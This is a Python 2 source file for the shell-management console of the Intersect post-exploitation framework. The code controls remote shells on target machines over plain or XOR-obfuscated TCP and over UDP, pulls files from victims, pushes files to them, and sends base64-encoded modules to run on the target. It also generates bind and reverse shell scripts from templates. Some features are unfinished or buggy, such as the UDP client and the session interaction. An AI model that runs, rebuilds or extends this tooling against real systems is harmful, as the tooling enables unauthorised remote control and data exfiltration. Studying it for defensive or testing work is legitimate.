#!/usr/bin/python
# Shell Management Utility
# Intersect Framework (c) 2012
# https://ohdae.github.com/Intersect-2.5/

import os, sys, re
import urlparse, urllib2
import random, string
import signal
import socket
import time
import shutil
from subprocess import Popen,PIPE,STDOUT,call
from base64 import *
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import datetime
import logging
import pexpect



active_sessions = {}
socksize = 4092

# Define all of our directory locations we'll be using through the application
current_loc = os.getcwd()
ActivityLog = (current_loc+"/Logs/ActivityLog")
Download_Dir = (current_loc+"/Storage/")
ModulesDir = (current_loc+"/src/Modules/remote/")
Templates = (current_loc+"/src/Templates/remote/")
Scripts = (current_loc+"/Scripts/")

Modules = []
for mods in os.listdir(ModulesDir):
    Modules.append(mods)

# Define logging information
logging.basicConfig(filename=ActivityLog, level=logging.INFO, format='%(asctime)s %(message)s')
tab_complete = True

try: # attempt to setup the tab completion and command history
    import readline
except ImportError:
    print "[!] Python readline is not installed. Tab completion will be disabled."
    tab_complete = False
    logging.info("Python Readline library not installed. Tab completion is disabled.")

if tab_complete == True:
    readline.parse_and_bind("tab: complete")


def banner():

    target = random.randrange(1,4)

    if target == 1:
        print """                         
              ___         __                                     __   
             |   |.-----.|  |_ .-----..----..-----..-----..----.|  |_ 
             |.  ||     ||   _||  -__||   _||__ --||  -__||  __||   _|
             |.  ||__|__||____||_____||__|  |_____||_____||____||____|
             |:  | post-exploitation framework                                                    
             |::.|                                                   
             `---'                                                    
"""

    elif target == 2:
        print """
             _______         __                                __   
            |_     _|.-----.|  |_.-----.----.-----.-----.----.|  |_ 
             _|   |_ |     ||   _|  -__|   _|__ --|  -__|  __||   _|
            |_______||__|__||____|_____|__| |_____|_____|____||____|
                                         Post-Exploitation Framework
                                                     bindshell.it.cx                                     
"""

    elif target == 3:
        print """
             ____  _  _  ____  ____  ____  ___  ____  ___  ____ 
            (_  _)( \( )(_  _)( ___)(  _ \/ __)( ___)/ __)(_  _)
             _)(_  )  (   )(   )__)  )   /\__ \ )__)( (__   )(  
            (____)(_)\_) (__) (____)(_)\_)(___/(____)\___) (__)
                         post-exploitation framework
"""

    elif target == 4:
        print """
                     _       _                          _   
                    (_)     | |                        | |  
                     _ _ __ | |_ ___ _ __ ___  ___  ___| |_ 
                    | | '_ \| __/ _ \ '__/ __|/ _ \/ __| __|
                    | | | | | ||  __/ |  \__ \  __/ (__| |_ 
               __   |_|_| |_|\__\___|_|  |___/\___|\___|\__|  _  
              / _|             post-exploitation             | |   
             | |_ _ __ __ _ _ __ ___   _____      _____  _ __| | __
             |  _| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
             | | | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
             |_| |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\
                                                                   
                                                            
"""



def xor(string, key): # quick XOR encrypt/decrypt function
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, Shutting down now!");
    Shutdown()


def Shutdown():
    sys.exit()


def show_active(): # Parses the active_sessions dictionary when :active command is given
    print("\nActive shell sessions: ")
    for key, value in active_sessions.iteritems():
        print "%s-%s" % (key, value)


def shell_help(): # help menu displayed for all shells
    print(" Available Commands: ")
    print("---------------------------------")
    print("    :background  =>  send this shell to the background")
    print("          :mods  =>  show available modules")
    print("   :info module  =>  display module information")
    print(" :download file  =>  download file from host")
    print("   :upload file  =>  upload file to host")
    print("   :exec module  =>  sends script to host and executes")
    print("         :files  =>  display contents of your files directory")
    print("        :killme  =>  shuts down server completely")
    print("          :quit  =>  closes shell connection\n")
    
    
def about_dialog():
    print """\n
                Intersect Framework
                  revision 2.5.5
              created by bindshell labs
    
    Intersect is a post-exploitation framework written in Python.
    The purpose of this framework and the included modules are to
    assist penetration testers in automating and controlling many
    post-exploitation and data exfiltration tasks. There is full
    documentation, guides and license information available in the
    Docs directory.
    
    Using the Management application, you can interact with remote
    targets that are running an Intersect shell, whether they are
    serving a client or listener. You can interact with multiple
    remote targets at once, setup listeners to accept multiple
    connections and execute Intersect modules remotely.\n
    """


class Completer:
    def __init__(self):
        self.words = ["help", "active", "about", "client", "clear", "listener", "files", "interact", "exit",
                        "exec", "download", "upload", "background", "mods", "quit", "info", "killme", "build"]
        self.prefix = ":"


    def complete(self, prefix, index):
        if prefix != self.prefix:
            self.matching_words = [w for w in self.words if w.startswith(prefix)]
            self.prefix = prefix
        else:
            pass
        try:
            return self.matching_words[index]
            return self.match_mods[index]
        except IndexError:
            return None
                
                
class management(object):
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "


    def core(self): # Central menu of this application
        print """
Intersect Framework - Shell Management
--------------------------------------
For a complete list of commands type :help
\n\n"""

        
        while True:

            if tab_complete == True:
                completer = Completer()
                readline.set_completer(completer.complete)
                
            signal.signal(signal.SIGINT, signalHandler)

            command = raw_input(" intersect %s " % (self.header))
        
            # Select and configure a new shell client
            if command == (":client"):
                print("\nConfigure your client settings")
                print("enter a name for your session:")
                name = raw_input(" client %s " % (self.header))
                            
                print("\nchoose your client shell type:")
                shells = [ "tcp", "xor", "udp" ]
                print(" [ tcp , xor , udp ] ")
                type = raw_input(" client %s " % (self.header))
                if type in shells:
                    client_type = type
                else:
                    print("[!] Invalid entry! Setting to default client type of 'tcp'")
                    client_type = 'tcp'
                    
                print("\nenter remote hostname or IP address:")
                host = raw_input(" client %s " % (self.header))
                RHOST = host
                
                print("\nenter remote port number:")
                port = raw_input(" client %s " % (self.header))
                if port.isdigit():
                    RPORT = port
                else:
                    print("[!] Invalid entry! Setting to default port of 4444")
                    RPORT = 4444
                                    
                # Start our new client we just configured
                if client_type == 'tcp':
                    print "Spawning new TCP client..."
                    logging.info("New TCP client started. Name: %s" % name)
                    # uses pexpect to spawn a new process for our client. This will be used
                    # in the future to handle mulitple shells at once via the :active and :interact commands
                    child = pexpect.spawn(tcp_client.start(RHOST, RPORT, name))
                    
                elif client_type == 'udp':
                    print("Spawning new UDP client...")
                    logging.info("New UDP client started. Name: %s" % name)
                    child = pexpect.spawn(udp_client.start(RHOST, RPORT, name))
                    
                elif client_type == 'xor':
                    print("enter your xor private key:")
                    pkey = raw_input(" client %s" % (self.header))
                    PKEY = pkey
                    child = pexpect.spawn(xor_client.start(RHOST, RPORT, PKEY, name))
                    
            # Configure and start a new shell listener
            elif command == (":listener"):
                print("\nConfigure your listener settings")
                print("enter a name for your session:")
                name = raw_input(" listener %s " % (self.header))
                            
                print("\nchoose your listener shell type:")
                shells = [ "tcp", "xor" ]
                print(" [ tcp , xor ] ")
                type = raw_input(" listener %s " % (self.header))
                if type in shells:
                    client_type = type
                else:
                    print("[!] Invalid entry! Setting to default client type of 'tcp'")
                    client_type = 'tcp'
                    
                print("\nenter listener IP address:")
                host = raw_input(" listener %s " % (self.header))
                LHOST = host
                
                print("\nenter listener port number:")
                port = raw_input(" listener %s " % (self.header))
                if port.isdigit():
                    LPORT = port
                else:
                    print("[!] Invalid entry! Setting to default port of 5555")
                    LPORT = 5555
                    
                
                if client_type == 'tcp':
                    print "Spawning new TCP listener..."
                    logging.info("New TCP listener started. Name: %s" % name)
                    child = pexpect.spawn(tcp_listen.start(LHOST, LPORT, name))
                    
                    
                elif client_type == 'xor':
                    print("enter your xor private key:")
                    pkey = raw_input(" listener %s" % (self.header))
                    PKEY = pkey
                    logging.info("New XOR TCP listener started. Name: %s" % name)
                    child = pexpect.spawn(xor_listen.start(LHOST, LPORT, PKEY, name))
            
            elif command == (":active"):
                show_active() # Displays the active_session dictionary
            
            elif command == (":build"):
                # This doesn't actually do anything yet
                self.make_server()
                
            elif command == (":help"):
                print("\nAvailable Commands: ")
                print("    :active  =>  list active Intersect sessions")
                print("     :about  =>  display the 'about' dialog")
                print("     :clear  =>  clears the screen")
                print("    :client  =>  start a new client")
                print("     :build  =>  build a new server-side shell")
                print("      :help  =>  show this help menu")
                print("  :listener  =>  start a new listener")
                print("  :interact  =>  interact with an active session")
                print("      :exit  =>  exit Intersect completely\n")    
            
            elif command == (":about"):
                about_dialog()
                
            elif command == (":exit"):
                print("[!] Shutting down Intersect!")
                sys.exit(0)
                
            elif command.startswith(":interact"):
                print("[!] Feature not yet fully implemented!")
                # TODO:
                # This will eventually let users interact with shells they have sent
                # to the background via :background command. The name and child info
                # is sent to the active_sessions dictionary, then is parsed and returns
                # the specified shell to the foreground using the pexpect.interact() cmd
                
                #getname = command.split(" ")
                #session_name = getname[1]
                #for names, sessions in active_sessions:
                #    if names == session_name:
                #        value.interact()
                
            elif command == (":clear"):
                os.system("clear")
                
            else:
                print(" %s Invalid Command!" % (self.warning))
                # You enter a command that doesn't exist! What the hell, man!

    def make_server(self):
        print("Configuration Menu\n")
        print("""
              1 => TCP bind
              2 => TCP reverse
              3 => XOR TCP bind
              4 => XOR TCP reverse
              5 => Return to Main Menu
              
              NOTICE: The AESHTTP shell and the UDP shell are still being built.
                        They both will be implemented soon.
              """)
              
              
        while True:
            choice = raw_input(" build %s" % (self.header))
            
            signal.signal(signal.SIGINT, signalHandler)
                  
            if choice == "1":
                template = (Templates+"tcpbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    management.make_server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                port = raw_input(" bind port => ")
                if port.isdigit():
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\nHOST = '%s'" % host)
                    makeshell.write("\nPORT = %s" % port)
                    makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                    makeshell.write("\nconn.bind((HOST, PORT))")
                    makeshell.write("\nconn.listen(5)")
                    makeshell.write("\naccept()")
                    makeshell.close()
                    
                    print("[+] New shell created!")
                    print("[+] Location: %s" % Scripts+name)
                    management.core()
                else:
                    print("[!] Invalid port!")
                    management.make_server()
                
                
            elif choice == "2":
                template = (Templates+"tcprev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" tcp-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    management.make_server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                port = raw_input(" listen port => ")
                if port.isdigit():
                    newshell = open(Scripts+name, "a")
                    newshell.write("\n    HOST = '%s'" % host)
                    newshell.write("\n    PORT = %s" % port)
                    newshell.write("\n\nglobalvars()")
                    newshell.write("\nmain()")
                    newshell.close()
                    
                    print("[+] New shell created!")
                    print("[+] Location: %s" % Scripts+name)
                    management.core()
                else:
                    print("[!] Invalid port!")
                    management.make_server()
                
                                
            elif choice == "3":
                template = (Templates+"xorbind.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-bind => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    management.make_server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" bind IP => ")
                port = raw_input(" bind port => ")
                pin = raw_input(" xor key => ")
                if port.isdigit():
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\nHOST = '%s'" % host)
                    makeshell.write("\nPORT = %s" % port)
                    makeshell.write("\npin = '%s'" % pin)
                    makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                    makeshell.write("\nconn.bind((HOST, PORT))")
                    makeshell.write("\nconn.listen(5)")
                    makeshell.write("\naccept()")
                    makeshell.close()
                    
                    print("[+] New shell created!")
                    print("[+] Location: %s" % Scripts+name)
                    management.core()
                else:
                    print("[!] Invalid port!")
                    management.make_server()
                    
            elif choice == "4":
                template = (Templates+"xorrev.py")
                print("\nEnter a name for your new shell. The final product will be saved in the Scripts directory.")
                name = raw_input(" xor-rev => ")
                if os.path.exists(Scripts+name):
                    print("[!] A file by this name all ready exists!")
                    management.make_server()
                else:
                    shutil.copy2(template, Scripts+name)
                
                host = raw_input(" listen IP => ")
                port = raw_input(" listen port => ")
                pin = raw_input(" xor key => ")
                if port.isdigit():
                    makeshell = open(Scripts+name, "a")
                    makeshell.write("\n    HOST = '%s'" % host)
                    makeshell.write("\n    PORT = %s" % port)
                    makeshell.write("\n    pin = '%s'" % pin)
                    makeshell.write("\n\nglobalvars()")
                    makeshell.write("\nmain()")
                    makeshell.close()
                    makeshell.close()
                    
                    print("[+] New shell created!")
                    print("[+] Location: %s" % Scripts+name)
                    management.core()
                else:
                    print("[!] Invalid port!")
                    management.make_server()
                
            elif choice == "5":
                os.system("clear")
                management.core()
                
            else:
                print("%s Invalid option!" % (self.header))



class tcp_client:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        
        
    def download(self, filename, session):
        filename = filename.replace("/","_")
        data = server.recv(socksize)
        newfile = file(Download_Dir+session+"-"+filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(Download_Dir+session+"-"+filename):
            print("[+] File saved: %s" % Download_Dir+session+"-"+filename)
        else:
            print("[!] Error saving file: %s" % Download_Dir+session+"-"+filename)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            server.sendall(filedata)
        else:
            print("[!] File not found!")
        
        
    def start(self, HOST, PORT, name):
        active_sessions[name] = HOST+":"+PORT
        HOST = HOST
        PORT = int(PORT)
        
        global server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.connect((HOST, PORT))
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            logging.info("New connection established to %s" % name)
        except:
            print("[!] Connection error!")
            logging.error("Connection to %s failed." % name)
            management.core()
            
        while True:
            data = server.recv(socksize)
            
            if data.startswith(":savef"):
                getname = data.split(" ")
                fname = getname[1]
                logging.info("Saving %s from %s" % (fname, name))
                self.download(fname, name)
                
            elif data == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == "shell => ":
                cmd = raw_input(data)
                server.sendall(str(cmd))
                
                if cmd == (':killme'):
                    print("[!] Shutting down server!")
                    logging.info("Shutting down %s completely." % name)
                    server.close()
                    management.core()
                    
                elif cmd == (':background'):
                    print("[!] Sending shell to background..")
                    print("[!] The connection will remain alive.")
                    logging.info("Sending %s to background" % name)
                    # Unless we specifically close our shell connection, it will remain
                    # open. Using this command without the full :interact and :active
                    # implementation is not a good idea. You will not be able to get your
                    # shell back if you send it to the background.
                    management.core()
                    
                elif cmd.startswith(':download'):
                    getname = cmd.split(" ")
                    fname = getname[1]
                    logging.info("Saving %s from %s." % (fname, name))
                    self.download(fname, name)
                    
                elif cmd.startswith(':upload'):
                    getname = cmd.split(" ")
                    loc_file = getname[1]
                    logging.info("Uploading %s to %s." % (loc_name, name))
                    self.upload(loc_file)
                    
                elif cmd.startswith(':exec'):
                    getname = cmd.split(" ")
                    modname = getname[1]

                    if os.path.exists(ModulesDir+modname):
                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                        filedata = sendfile.read()
                        sendfile.close()
                        time.sleep(3)
                        filedata = b64encode(filedata)                  # base64 encode file and send to server
                        server.sendall(filedata)
                        logging.info("Executing %s on %s" % (modname, name))
                        data = server.recv(socksize)                    # wait to receive the OK msg from server, return to loop
                    else:
                        pass
                        
                elif cmd == (":help"):
                    shell_help()
                    
                elif cmd.startswith(":info"):
                    getname = cmd.split(' ')
                    modname = getname[1]
                    # parses each module for description information
                    if os.path.exists(ModulesDir+modname):
                        info = open(ModulesDir+modname)
                        for line in info:
                            if "@description" in line:
                                split = line.split(":")
                                des = split[1]
                                print("\nDescription: %s " % des)
                            if "@author" in line:
                                split = line.split(":")
                                author = split[1]
                                print("Author: %s " % author)              
                                    
                            else:
                                pass
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"): # lists the contents of the Storage directory for any files you've downloaded
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s | grep %s" % (Download_Dir, name))
                    
                elif cmd == (":quit"):
                    print("[!] Closing shell connection.")
                    logging.info("Closing connection to %s" % name)
                    server.close()
                    management.core()
                    
                    
            elif data:
                print data
                
        server.close()

class xor_client:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        
    def download(self, filename):
        filename = filename.replace("/","_")
        data = server.recv(socksize)
        newfile = file(Download_Dir+filename, "wb")
        time.sleep(2)
        filedata = xor(data, pin)
        newfile.write(filedata)
        newfile.close()
        if os.path.exists(Download_Dir+filename):
            print("[+] File saved: %s" % Download_Dir+filename)
        else:
            print("[!] Error saving file: %s" % Download_Dir+filename)
        
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            send_data = xor(filedata, pin)
            server.sendall(send_data)
        else:
            print("[!] File not found!")
        
    def start(self, HOST, PORT, pkey, name):
        HOST = HOST
        PORT = int(PORT)
        
        global pin
        global server
        pin = pkey
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.connect((HOST, PORT))
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            logging.info("New connection established to %s" % name)
        except:
            print("[!] Connection error!")
            logging.error("Connection to %s failed." % name)
            management.core()
            
        while True:
            data = server.recv(socksize)
            data2 = xor(data, pin)
            
            if data2.startswith(":savef"):
                getname = data2.split(" ")
                fname = getname[1]
                logging.info("Saved file %s from %s" % (fname, name))
                self.download(fname)
                
            elif data2 == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data2 == "shell => ":
                cmd = raw_input(data2)
                cmd2 = xor(cmd, pin)
                server.sendall(str(cmd2))
                
                if cmd == (':killme'):
                    print("[!] Shutting down server!")
                    server.close()
                    management.core()
                    
                elif cmd == (':quit'):
                    print("[!] Closing shell connection!")
                    server.close()
                    management.core()
                    
                elif cmd == (':background'):
                    print("[!] Sending shell to background...")
                    print("[!] Connection will remain open.")
                    management.core()
                    
                elif cmd.startswith(':download'):
                    getname = cmd.split(" ")
                    fname = getname[1]
                    self.download(fname)
                    
                elif cmd.startswith(':upload'):
                    getname = cmd.split(" ")
                    loc_file = getname[1]
                    self.upload(loc_file)
                    
                elif cmd.startswith(':exec'):
                    getname = cmd.split(" ")
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                        filedata = sendfile.read()
                        sendfile.close()
                        time.sleep(3)
                        filedata = b64encode(filedata)                  # base64 encode file and send to server
                        server.sendall(filedata)
                        data = server.recv(socksize)                    # wait to receive the OK msg from server
                    else:
                        pass
                        
                elif cmd == (":help"):
                    shell_help()
                    
                elif cmd.startswith(":info"):
                    getname = cmd.split(' ')
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        info = open(ModulesDir+modname)
                        for line in info:
                            if "@description" in line:
                                split = line.split(":")
                                des = split[1]
                                print("\nDescription: %s " % des)
                            if "@author" in line:
                                split = line.split(":")
                                author = split[1]
                                print("Author: %s " % author)              
                                    
                            else:
                                pass
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s" % Download_Dir)
                    
                    
            elif data:
                data2 = xor(data, pin)
                print data2
                
        server.close()
        

class udp_client:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        
    def start(self, RHOST, RPORT):
        PORT = int(RPORT)
        addr = (HOST,PORT)
        
        UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print("UDP Interactive Shell.\nEnter ':help' for a list of extra available commands.")
        
        while 1:
            cmd = raw_input("Intersect => ")
            (UDPSock.sendto(cmd,addr))
            
            if cmd == ":killme":
                (UDPSock.sendto(":killme",addr))
                print("[!] Closing shell connection!")
                sys.exit(0)
                
            elif cmd == ":help":
                shell_help()
                
            elif cmd == ":background":
                management.core()
                
            elif cmd.startswith(":exec"):
                print("[!] Command not fully implemented yet. Sorry!")
                
            else:
                data,addr = UDPSock.recvfrom(buf)
                print data
                
        UDPSock.close()
        

class tcp_listen:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        
        
    def download(self, filename):
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(Download_Dir+filename, "wb")
        time.sleep(2)
        newfile.write(data)
        newfile.close()
        if os.path.exists(Download_Dir+filename):
            print("[+] File saved: %s" % Download_Dir+filename)
        else:
            print("[!] Error saving file: %s" % Download_Dir+filename)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
        else:
            print("[!] File not found!")
                  
                  
    def start(self, LHOST, LPORT, name):
        active_sessions[name] = LHOST+":"+LPORT
        
        LPORT = int(LPORT)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        
        server.bind((LHOST, LPORT))
        server.listen(5)
        print("Listening on port %s.." % LPORT)
        global conn
        conn, addr = server.accept()
        print("New Connection!")
        
        while True:
            data = conn.recv(socksize)
            
            if data.startswith(":savef"):
                getname = data.split(" ")
                fname = getname[1]
                self.download(fname)
                
            elif data == ("Complete"):
                writelog("Executed %s")
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == "shell => ":
                cmd = raw_input(data)
                conn.sendall(str(cmd))
                
                if cmd == (':killme'):
                    print("[!] Shutting down server!")
                    conn.close()
                    management.core()
                    
                elif cmd == (':background'):
                    print("[!] Sending shell to background..")
                    print("[!] The connection will remain alive.")
                    management.core()
                    
                elif cmd.startswith(':download'):
                    getname = cmd.split(" ")
                    fname = getname[1]
                    self.download(fname)
                    
                elif cmd.startswith(':upload'):
                    getname = cmd.split(" ")
                    loc_file = getname[1]
                    self.upload(loc_file)
                    
                elif cmd.startswith(':exec'):
                    getname = cmd.split(" ")
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                        filedata = sendfile.read()
                        sendfile.close()
                        time.sleep(3)
                        filedata = b64encode(filedata)         # base64 encode file and send to server
                        conn.sendall(filedata)
                        data = conn.recv(socksize)           # wait to receive the OK msg from server
                    else:
                        pass
                        
                elif cmd == (":help"):
                    shell_help()
                    
                elif cmd.startswith(":info"):
                    getname = cmd.split(' ')
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        info = open(ModulesDir+modname)
                        for line in info:
                            if "@description" in line:
                                split = line.split(":")
                                des = split[1]
                                print("\nDescription: %s " % des)
                            if "@author" in line:
                                split = line.split(":")
                                author = split[1]
                                print("Author: %s " % author)              
                                    
                            else:
                                pass
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Stored directory: ")
                    os.system("ls %s" % Download_Dir)
                    
                elif cmd == (":quit"):
                    print("[!] Shutting down connection.")
                    conn.close()
                    management.core()
                    
                    
            elif data:
                print data
                
        conn.close()
        
        
class xor_listen:
    def __init__(self):
        self.header = " => "
        self.warning = " [!] "
        
    def download(self, filename):
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(Download_Dir+filename, "wb")
        time.sleep(2)
        filedata = xor(data, pin)
        newfile.write(data)
        newfile.close()
        if os.path.exists(Download_Dir+filename):
            print("[+] File saved: %s" % Download_Dir+filename)
        else:
            print("[!] Error saving file: %s" % Download_Dir+filename)
        
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            send_data = xor(filedata, pin)
            conn.sendall(send_data)
        else:
            print("[!] File not found!")
        
    def start(self, HOST, PORT, pkey, name):
        HOST = HOST
        PORT = int(PORT)
        
        global pin
        global server
        pin = pkey

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.bind((HOST, PORT))
            server.listen(5)
            print("Listening on port %s.." % PORT)
            global conn
            conn, addr = server.accept()
            print("New Connection!")
        except:
            print("[!] Connection error!")
            management.core()
            
        while True:
            data = conn.recv(socksize)
            data2 = xor(data, pin)
            
            if data2.startswith(":savef"):
                getname = data2.split(" ")
                fname = getname[1]
                logging.info("Saved file %s from %s" % (fname, name))
                self.download(fname)
                
            elif data2 == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data2 == "shell => ":
                cmd = raw_input(data2)
                cmd2 = xor(cmd, pin)
                conn.sendall(str(cmd2))
                
                if cmd == (':killme'):
                    print("[!] Shutting down server!")
                    server.close()
                    management.core()
                    
                elif cmd == (':quit'):
                    print("[!] Closing shell connection!")
                    conn.close()
                    management.core()
                    
                elif cmd == (':background'):
                    print("[!] Sending shell to background...")
                    print("[!] Connection will remain open.")
                    management.core()
                    
                elif cmd.startswith(':download'):
                    getname = cmd.split(" ")
                    fname = getname[1]
                    self.download(fname)
                    
                elif cmd.startswith(':upload'):
                    getname = cmd.split(" ")
                    loc_file = getname[1]
                    self.upload(loc_file)
                    
                elif cmd.startswith(':exec'):
                    getname = cmd.split(" ")
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                        filedata = sendfile.read()
                        sendfile.close()
                        time.sleep(3)
                        filedata = b64encode(filedata)                  # base64 encode file and send to server
                        conn.sendall(filedata)
                        data = conn.recv(socksize)                    # wait to receive the OK msg from server
                    else:
                        pass
                        
                elif cmd == (":help"):
                    shell_help()
                    
                elif cmd.startswith(":info"):
                    getname = cmd.split(' ')
                    modname = getname[1]
                    
                    if os.path.exists(ModulesDir+modname):
                        info = open(ModulesDir+modname)
                        for line in info:
                            if "@description" in line:
                                split = line.split(":")
                                des = split[1]
                                print("\nDescription: %s " % des)
                            if "@author" in line:
                                split = line.split(":")
                                author = split[1]
                                print("Author: %s " % author)              
                                    
                            else:
                                pass
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s" % Download_Dir)
                    
                    
            elif data:
                data2 = xor(data, pin)
                print data2
                
        conn.close()
        
        
        
if __name__=='__main__':
  banner()
  management = management()
  tcp_client = tcp_client()
  xor_client = xor_client()
  udp_client = udp_client()
  tcp_listen = tcp_listen()
  xor_listen = xor_listen()
  management.core()

